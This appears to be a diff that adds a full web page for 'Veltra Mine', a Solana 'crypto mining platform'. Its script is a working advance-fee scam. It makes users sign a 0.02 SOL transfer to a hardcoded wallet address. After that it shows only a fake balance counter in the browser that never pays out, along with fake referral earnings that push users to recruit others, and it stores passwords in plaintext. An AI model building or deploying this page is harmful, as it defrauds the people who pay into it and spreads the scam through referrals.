@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Veltra Mine - Crypto Mining Platform</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.93.0/index.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(135deg, #0a0615 0%, #1c1138 100%);
+            color: #e8e1ff;
+            font-family: 'Poppins', sans-serif;
+            min-height: 100vh;
+            margin: 0;
+            overflow-x: hidden;
+        }
+        .section {
+            padding: 5rem 2rem;
+            max-width: 1280px;
+            margin: 0 auto;
+            position: relative;
+        }
+        .card {
+            background: rgba(20, 10, 50, 0.92);
+            border-radius: 25px;
+            padding: 3rem;
+            box-shadow: 0 12px 50px rgba(139, 92, 246, 0.4), 0 0 20px rgba(236, 72, 153, 0.2);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(139, 92, 246, 0.3);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        .card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 12px 60px rgba(139, 92, 246, 0.5), 0 0 30px rgba(236, 72, 153, 0.3);
+        }
+        .btn {
+            background: linear-gradient(45deg, #7c3aed, #db2777);
+            padding: 0.9rem 2.5rem;
+            border-radius: 15px;
+            color: white;
+            font-weight: 700;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            border: none;
+            cursor: pointer;
+        }
+        .btn:hover {
+            transform: scale(1.08);
+            box-shadow: 0 0 25px rgba(139, 92, 246, 0.7);
+        }
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            background: rgba(255, 255, 255, 0.25);
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            transition: width 0.4s ease, height 0.4s ease;
+        }
+        .btn:hover::after {
+            width: 400px;
+            height: 400px;
+        }
+        input {
+            background: rgba(255, 255, 255, 0.12);
+            border: 1px solid #7c3aed;
+            padding: 0.9rem;
+            border-radius: 10px;
+            color: white;
+            width: 100%;
+            font-size: 1rem;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            margin-bottom: 1rem;
+        }
+        input:focus {
+            border-color: #db2777;
+            box-shadow: 0 0 10px rgba(219, 39, 119, 0.5);
+            outline: none;
+        }
+        .glow {
+            text-shadow: 0 0 20px #7c3aed, 0 0 40px #db2777;
+        }
+        .header-bg {
+            background: linear-gradient(180deg, #140a2e 0%, transparent 100%);
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+        }
+        .section-title {
+            font-size: 2.8rem;
+            font-weight: 800;
+            margin-bottom: 2rem;
+            background: linear-gradient(45deg, #7c3aed, #db2777);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .animate-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 30% 70%, rgba(139, 92, 246, 0.25) 0%, transparent 60%);
+            animation: pulse 8s infinite;
+            z-index: -1;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.4; }
+            50% { transform: scale(1.3); opacity: 0.6; }
+            100% { transform: scale(1); opacity: 0.4; }
+        }
+        .balance-circle {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 150px;
+            height: 150px;
+            background: linear-gradient(45deg, #7c3aed, #db2777);
+            border-radius: 50%;
+            box-shadow: 0 0 30px rgba(139, 92, 246, 0.6), inset 0 0 20px rgba(0, 0, 0, 0.5);
+            margin: 1rem auto;
+            font-size: 2rem;
+            font-weight: 800;
+            color: #fff;
+            text-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
+        }
+        .profile-item {
+            margin-bottom: 1rem;
+            font-size: 1.1rem;
+        }
+        .profile-item span {
+            font-weight: 600;
+            color: #db2777;
+        }
+        .hidden-section {
+            display: none;
+        }
+        .flex { display: flex; }
+        .justify-between { justify-content: space-between; }
+        .items-center { align-items: center; }
+        .justify-center { justify-content: center; }
+        .mb-4 { margin-bottom: 1rem; }
+        .mb-6 { margin-bottom: 1.5rem; }
+        .mt-6 { margin-top: 1.5rem; }
+        .space-x-4 > :not(:last-child) { margin-right: 1rem; }
+        .text-lg { font-size: 1.125rem; }
+        .text-xl { font-size: 1.25rem; }
+        .text-sm { font-size: 0.875rem; }
+        .font-bold { font-weight: 700; }
+        .font-medium { font-weight: 500; }
+        .font-semibold { font-weight: 600; }
+        .text-red-400 { color: #f87171; }
+        .text-4xl { font-size: 2.25rem; }
+        .text-2xl { font-size: 1.5rem; }
+        .bg-gray-900 { background-color: #111827; }
+        .px-4 { padding-left: 1rem; padding-right: 1rem; }
+        .py-2 { padding-top: 0.5rem; padding-bottom: 0.5rem; }
+        .py-6 { padding-top: 1.5rem; padding-bottom: 1.5rem; }
+        .py-8 { padding-top: 2rem; padding-bottom: 2rem; }
+        .rounded-full { border-radius: 9999px; }
+        .text-center { text-align: center; }
+        .font-mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; }
+        .break-all { word-break: break-all; }
+        .max-w-md { max-width: 28rem; }
+    </style>
+</head>
+<body>
+    <header class="header-bg py-6">
+        <div class="section flex justify-between items-center">
+            <h1 class="text-4xl font-bold glow">Veltra Mine</h1>
+            <div id="wallet-status" class="text-sm font-medium bg-gray-900 px-4 py-2 rounded-full">Wallet: Not Connected</div>
+        </div>
+    </header>
+
+    <!-- Authentication Section -->
+    <section id="auth" class="section">
+        <div class="animate-bg"></div>
+        <div class="card">
+            <h2 class="section-title" id="auth-title">Sign Up</h2>
+            <p class="mb-6 text-lg" id="auth-message">Create an account to start mining with Veltra Mine.</p>
+            <div class="max-w-md mx-auto">
+                <input id="email-input" type="email" placeholder="Enter your email" class="mb-4">
+                <input id="password-input" type="password" placeholder="Enter your password" class="mb-4">
+                <input id="confirm-password-input" type="password" placeholder="Confirm your password" class="mb-4">
+                <button id="auth-button" class="btn mt-6 w-full">Sign Up</button>
+                <button id="switch-auth" class="btn mt-4 w-full">Already have an account? Login</button>
+            </div>
+            <p class="mt-4 text-red-400 font-medium text-center" id="auth-status"></p>
+        </div>
+    </section>
+
+    <!-- Profile Section -->
+    <section id="profile" class="section hidden-section">
+        <div class="animate-bg"></div>
+        <div class="card">
+            <h2 class="section-title">Your Profile</h2>
+            <div class="profile-item">Wallet Address: <span id="profile-wallet">Not Connected</span></div>
+            <div class="profile-item">Mined Balance: <span id="profile-balance">0</span> SOL</div>
+            <div class="profile-item">Referral Earnings: <span id="profile-referral-earnings">0</span> SOL</div>
+        </div>
+    </section>
+
+    <!-- Mining Section -->
+    <section id="mining" class="section hidden-section">
+        <div class="animate-bg"></div>
+        <div class="card">
+            <h2 class="section-title">Mine Veltra Points</h2>
+            <p class="mb-6 text-lg">Earn 1 SOL per day by mining with Veltra Mine!</p>
+            <div class="balance-circle" id="mining-balance">0</div>
+            <p class="mb-6 text-red-400 font-medium" id="transaction-status">Please complete the compulsory 0.02 SOL transaction to start mining.</p>
+            <div class="flex space-x-4 justify-center">
+                <button id="connect-wallet" class="btn">Connect Wallet</button>
+                <button id="pay-transaction" class="btn hidden">Pay 0.02 SOL to Start</button>
+                <button id="start-mining" class="btn hidden">Start Mining</button>
+            </div>
+            <p class="mt-6 text-sm text-center">Mining Rate: 1 SOL/day</p>
+        </div>
+    </section>
+
+    <!-- Referral Section -->
+    <section id="referral" class="section hidden-section">
+        <div class="animate-bg"></div>
+        <div class="card">
+            <h2 class="section-title">Referral Program</h2>
+            <p class="mb-6 text-lg">Invite friends and earn 0.01 SOL per referral!</p>
+            <p class="mb-4">Your Referral Link: <span id="referral-link" class="font-mono text-sm break-all">Connect wallet to generate</span></p>
+            <div class="flex space-x-4">
+                <input id="referral-input" type="text" placeholder="Enter referral code" class="max-w-md">
+                <button id="submit-referral" class="btn">Submit Referral</button>
+            </div>
+            <p class="mt-6 text-xl">Referral Earnings: <span id="referral-earnings" class="font-bold">0</span> SOL</p>
+        </div>
+    </section>
+
+    <!-- Tasks Section -->
+    <section id="tasks" class="section hidden-section">
+        <div class="animate-bg"></div>
+        <div class="card text-center">
+            <h2 class="section-title">Tasks</h2>
+            <p class="text-2xl font-semibold glow">Coming Soon</p>
+        </div>
+    </section>
+
+    <footer class="bg-black py-8 text-center">
+        <p class="text-sm">&copy; 2025 Veltra Mine. All rights reserved.</p>
+    </footer>
+
+    <script>
+        window.addEventListener('load', () => {
+            if (!window.solanaWeb3) {
+                alert('Failed to load Solana Web3.js library. Please check your internet connection and try again.');
+                return;
+            }
+
+            const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = window.solanaWeb3;
+            let walletKeypair = null;
+            let connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+            const recipientAddress = new PublicKey('2cF2AUHgbXSGMXPp1ckQ5xJmHD5ByR7DmK4TDf6VUC5Q');
+            let miningInterval = null;
+            let miningTimeout = null;
+            let balance = 0;
+            let referralEarnings = 0;
+            let isLoggedIn = false;
+
+            // Check if user has signed up
+            const authSection = document.getElementById('auth');
+            const authTitle = document.getElementById('auth-title');
+            const authMessage = document.getElementById('auth-message');
+            const confirmPasswordInput = document.getElementById('confirm-password-input');
+            const authButton = document.getElementById('auth-button');
+            const switchAuthButton = document.getElementById('switch-auth');
+            const authStatus = document.getElementById('auth-status');
+
+            const savedEmail = localStorage.getItem('email');
+            if (savedEmail) {
+                authTitle.innerText = 'Login';
+                authMessage.innerText = 'Sign in to access Veltra Mine.';
+                confirmPasswordInput.style.display = 'none';
+                authButton.innerText = 'Login';
+                switchAuthButton.innerText = 'Need an account? Sign Up';
+            }
+
+            // Switch between Sign Up and Login
+            switchAuthButton.addEventListener('click', () => {
+                if (authTitle.innerText === 'Sign Up') {
+                    authTitle.innerText = 'Login';
+                    authMessage.innerText = 'Sign in to access Veltra Mine.';
+                    confirmPasswordInput.style.display = 'none';
+                    authButton.innerText = 'Login';
+                    switchAuthButton.innerText = 'Need an account? Sign Up';
+                } else {
+                    authTitle.innerText = 'Sign Up';
+                    authMessage.innerText = 'Create an account to start mining with Veltra Mine.';
+                    confirmPasswordInput.style.display = 'block';
+                    authButton.innerText = 'Sign Up';
+                    switchAuthButton.innerText = 'Already have an account? Login';
+                }
+                authStatus.innerText = '';
+            });
+
+            // Authenticate (Sign Up or Login)
+            authButton.addEventListener('click', () => {
+                const email = document.getElementById('email-input').value;
+                const password = document.getElementById('password-input').value;
+                const confirmPassword = document.getElementById('confirm-password-input').value;
+
+                if (authButton.innerText === 'Sign Up') {
+                    if (email && password && confirmPassword) {
+                        if (!email.includes('@')) {
+                            authStatus.innerText = 'Please enter a valid email.';
+                            return;
+                        }
+                        if (password.length < 6) {
+                            authStatus.innerText = 'Password must be at least 6 characters.';
+                            return;
+                        }
+                        if (password !== confirmPassword) {
+                            authStatus.innerText = 'Passwords do not match.';
+                            return;
+                        }
+                        localStorage.setItem('email', email);
+                        localStorage.setItem('password', password);
+                        isLoggedIn = true;
+                        authStatus.innerText = 'Sign up successful! mine and refer consistently before withdrawal in the next 14 days. Loading dashboard...';
+                        authSection.style.display = 'none';
+                        document.getElementById('profile').classList.remove('hidden-section');
+                        document.getElementById('mining').classList.remove('hidden-section');
+                        document.getElementById('referral').classList.remove('hidden-section');
+                        document.getElementById('tasks').classList.remove('hidden-section');
+                    } else {
+                        authStatus.innerText = 'Please fill in all fields.';
+                    }
+                } else {
+                    const savedPassword = localStorage.getItem('password');
+                    if (email && password && email === savedEmail && password === savedPassword) {
+                        isLoggedIn = true;
+                        authStatus.innerText = 'Login successful! Loading dashboard...';
+                        authSection.style.display = 'none';
+                        document.getElementById('profile').classList.remove('hidden-section');
+                        document.getElementById('mining').classList.remove('hidden-section');
+                        document.getElementById('referral').classList.remove('hidden-section');
+                        document.getElementById('tasks').classList.remove('hidden-section');
+                    } else {
+                        authStatus.innerText = 'Invalid email or password.';
+                    }
+                }
+            });
+
+            // Connect Wallet
+            document.getElementById('connect-wallet').addEventListener('click', async () => {
+                if (!isLoggedIn) {
+                    alert('Please log in first!');
+                    return;
+                }
+                if (window.solana && window.solana.isPhantom) {
+                    try {
+                        const response = await window.solana.connect();
+                        walletKeypair = response.publicKey;
+                        document.getElementById('wallet-status').innerText = `Wallet: ${walletKeypair.toBase58().slice(0, 8)}...`;
+                        document.getElementById('profile-wallet').innerText = walletKeypair.toBase58();
+                        document.getElementById('pay-transaction').classList.remove('hidden');
+                        document.getElementById('referral-link').innerText = `https://veltramine.com/?ref=${walletKeypair.toBase58()}`;
+                    } catch (err) {
+                        alert('Failed to connect wallet: ' + err.message);
+                    }
+                } else {
+                    alert('Please install Phantom Wallet!');
+                }
+            });
+
+            // Pay Compulsory Transaction
+            document.getElementById('pay-transaction').addEventListener('click', async () => {
+                if (!walletKeypair) {
+                    alert('Please connect your wallet first!');
+                    return;
+                }
+                try {
+                    const transaction = new Transaction().add(
+                        SystemProgram.transfer({
+                            fromPubkey: walletKeypair,
+                            toPubkey: recipientAddress,
+                            lamports: 0.02 * LAMPORTS_PER_SOL
+                        })
+                    );
+                    const { blockhash } = await connection.getLatestBlockhash();
+                    transaction.recentBlockhash = blockhash;
+                    transaction.feePayer = walletKeypair;
+                    const signed = await window.solana.signTransaction(transaction);
+                    const signature = await connection.sendRawTransaction(signed.serialize());
+                    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
+                    if (confirmation.value.err) {
+                        throw new Error('Transaction failed to confirm');
+                    }
+                    document.getElementById('transaction-status').innerText = 'Transaction successful! You can now start mining.';
+                    document.getElementById('pay-transaction').classList.add('hidden');
+                    document.getElementById('start-mining').classList.remove('hidden');
+                } catch (err) {
+                    alert('Transaction failed: ' + err.message);
+                }
+            });
+
+            // Start Mining
+            document.getElementById('start-mining').addEventListener('click', () => {
+                if (!miningInterval) {
+                    miningInterval = setInterval(() => {
+                        balance += 1 / (24 * 60 * 60); // 1 SOL per day
+                        const formattedBalance = balance.toFixed(6);
+                        document.getElementById('mining-balance').innerText = formattedBalance;
+                        document.getElementById('profile-balance').innerText = formattedBalance;
+                    }, 1000);
+                    miningTimeout = setTimeout(() => {
+                        clearInterval(miningInterval);
+                        miningInterval = null;
+                        document.getElementById('start-mining').innerText = 'Start Mining';
+                        document.getElementById('transaction-status').innerText = 'Mining stopped after 24 hours. Click Start Mining to continue.';
+                    }, 24 * 60 * 60 * 1000); // 24 hours
+                    document.getElementById('start-mining').innerText = 'Mining...';
+                }
+            });
+
+            // Submit Referral
+            document.getElementById('submit-referral').addEventListener('click', () => {
+                const referralCode = document.getElementById('referral-input').value;
+                if (referralCode) {
+                    referralEarnings += 0.01; // 0.01 SOL per referral
+                    const formattedEarnings = referralEarnings.toFixed(6);
+                    document.getElementById('referral-earnings').innerText = formattedEarnings;
+                    document.getElementById('profile-referral-earnings').innerText = formattedEarnings;
+                    alert('Referral submitted! You earned 0.01 SOL.');
+                } else {
+                    alert('Please enter a valid referral code.');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
